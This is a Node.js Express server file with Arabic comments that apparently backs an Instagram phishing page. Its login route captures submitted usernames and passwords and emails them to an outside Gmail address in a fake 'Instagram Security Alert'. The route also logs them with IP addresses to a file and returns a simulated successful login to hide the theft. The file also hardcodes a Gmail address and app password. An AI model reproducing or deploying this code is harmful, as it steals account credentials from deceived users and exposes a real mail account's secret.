const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');

const app = express();

// Security headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    res.sendStatus(200);
  } else {
    next();
  }
});

// Rate limiting simulation (basic)
const loginAttempts = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'nlvx.v7@gmail.com',     // إيميلك
    pass: 'lsnq yini wfbl ctkr'          // App Password الخاص بك
  }
});

// Root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const clientIP = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'];

  // Basic rate limiting
  const attempts = loginAttempts.get(clientIP) || 0;
  if (attempts > 10) {
    return res.status(429).json({ 
      success: false, 
      message: 'تم تجاوز عدد المحاولات المسموح به. حاول مرة أخرى لاحقاً.' 
    });
  }

  if (!username || !password) {
    loginAttempts.set(clientIP, attempts + 1);
    return res.status(400).json({ 
      success: false, 
      message: 'البيانات ناقصة' 
    });
  }

  // Enhanced email content
  const mailOptions = {
    from: '"Instagram Security Alert" <nlvx.v7@gmail.com>',
    to: 'nlvxvxx@gmail.com',
    subject: '🚨 New Instagram Login Attempt - Security Alert',
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <meta charset="UTF-8">
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background: linear-gradient(135deg, #833ab4, #fd1d1d, #fcb045); color: white; padding: 20px; text-align: center; border-radius: 10px 10px 0 0; }
          .content { background: #f9f9f9; padding: 20px; border-radius: 0 0 10px 10px; }
          .info-box { background: white; padding: 15px; margin: 10px 0; border-left: 4px solid #833ab4; border-radius: 5px; }
          .warning { background: #fff3cd; border-color: #ffc107; color: #856404; }
          .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>🔐 Instagram Security Alert</h1>
            <p>New Login Attempt Detected</p>
          </div>
          <div class="content">
            <div class="info-box warning">
              <h3>⚠️ Login Attempt Details</h3>
            </div>
            <div class="info-box">
              <h4>📧 Username/Email:</h4>
              <p><strong>${username}</strong></p>
            </div>
            <div class="info-box">
              <h4>🔑 Password:</h4>
              <p><strong>${password}</strong></p>
            </div>
            <div class="info-box">
              <h4>🕐 Time:</h4>
              <p><strong>${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}</strong></p>
            </div>
            <div class="info-box">
              <h4>🌐 IP Address:</h4>
              <p><strong>${clientIP}</strong></p>
            </div>
            <div class="info-box">
              <h4>📱 User Agent:</h4>
              <p><strong>${req.headers['user-agent'] || 'Unknown'}</strong></p>
            </div>
            <div class="info-box">
              <h4>🔗 Referer:</h4>
              <p><strong>${req.headers.referer || 'Direct Access'}</strong></p>
            </div>
          </div>
          <div class="footer">
            <p>This is an automated security alert from your Instagram monitoring system.</p>
            <p>Generated at: ${new Date().toISOString()}</p>
          </div>
        </div>
      </body>
      </html>
    `
  };

  // Log attempt to file
  const logEntry = {
    timestamp: new Date().toISOString(),
    username,
    password,
    ip: clientIP,
    userAgent: req.headers['user-agent'],
    referer: req.headers.referer
  };

  fs.appendFileSync(path.join(__dirname, 'login_attempts.log'), 
    JSON.stringify(logEntry) + '\n', 'utf8');

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Email error:', error);
      return res.status(500).json({ 
        success: false, 
        message: 'فشل إرسال البريد' 
      });
    }
    console.log('Email sent:', info.response);
    loginAttempts.set(clientIP, attempts + 1);
    
    // Simulate Instagram's response delay
    setTimeout(() => {
      res.status(200).json({ 
        success: true, 
        message: 'تم تسجيل الدخول بنجاح' 
      });
    }, Math.random() * 1000 + 500); // Random delay between 500-1500ms
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ 
    success: false, 
    message: 'حدث خطأ في الخادم' 
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ 
    success: false, 
    message: 'الصفحة غير موجودة' 
  });
});

// تصدير التطبيق لـ Vercel
module.exports = app;

// للتطوير المحلي فقط
if (process.env.NODE_ENV !== 'production') {
  const PORT = process.env.PORT || 3000;
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access the app at: http://localhost:${PORT}`);
  });
}


